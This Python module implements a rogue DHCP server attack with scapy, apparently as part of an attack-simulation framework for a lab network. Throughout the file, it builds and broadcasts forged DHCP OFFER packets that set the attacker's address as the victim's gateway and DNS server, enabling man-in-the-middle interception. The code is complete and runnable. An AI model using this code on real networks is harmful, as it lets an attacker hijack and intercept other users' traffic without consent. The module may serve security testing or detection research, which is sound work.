"""Rogue DHCP Server attack module.

Sends DHCP OFFER packets from an unauthorized server, attempting to
race the legitimate DHCP server and redirect victim traffic through
the attacker by offering a rogue gateway and DNS server.

DHCP has no built-in server authentication — clients accept the first
OFFER they receive, making this a viable MITM vector.
"""

import time
from datetime import datetime

from scapy.all import BOOTP, DHCP, Ether, IP, UDP, RandInt, sendp

from attacks.base import BaseAttack
from common.models import AttackResult


class RogueDHCP(BaseAttack):
    """Rogue DHCP server attack simulation.

    Crafts DHCP OFFER packets that advertise the attacker's IP as the
    gateway and DNS server. If the rogue OFFER reaches the victim before
    the legitimate server's, the victim will route through the attacker.
    """

    attack_type = "rogue_dhcp"

    def __init__(
        self,
        attacker_ip: str,
        offered_ip: str = "172.20.0.100",
        victim_mac: str = "ff:ff:ff:ff:ff:ff",
        interface: str = "eth0",
    ):
        """Initialize the rogue DHCP attack.

        Args:
            attacker_ip: IP of the attacker (used as rogue gateway/DNS).
            offered_ip: IP address to offer the victim.
            victim_mac: MAC address of the victim (broadcast if unknown).
            interface: Network interface to send packets on.
        """
        self.attacker_ip = attacker_ip
        self.offered_ip = offered_ip
        self.victim_mac = victim_mac
        self.interface = interface

    def launch(self, count: int = 5, interval: float = 0.2) -> AttackResult:
        """Send rogue DHCP OFFER packets.

        Args:
            count: Number of rogue OFFER packets to send.
            interval: Seconds between each packet.

        Returns:
            AttackResult with attack metadata.
        """
        packet = (
            Ether(dst=self.victim_mac)
            / IP(src=self.attacker_ip, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(
                op=2,                           # Boot Reply
                yiaddr=self.offered_ip,         # "Your" (client) IP address
                siaddr=self.attacker_ip,        # Server IP address
                xid=int(RandInt()),             # Transaction ID
            )
            / DHCP(
                options=[
                    ("message-type", "offer"),
                    ("server_id", self.attacker_ip),
                    ("lease_time", 3600),
                    ("router", self.attacker_ip),           # Rogue gateway
                    ("name_server", self.attacker_ip),      # Rogue DNS
                    ("subnet_mask", "255.255.255.0"),
                    "end",
                ]
            )
        )

        start_time = datetime.now()
        start = time.monotonic()

        sendp(
            packet,
            count=count,
            inter=interval,
            iface=self.interface,
            verbose=False,
        )

        duration = time.monotonic() - start

        return AttackResult(
            attack_type=self.attack_type,
            packets_sent=count,
            duration_s=duration,
            start_time=start_time,
        )
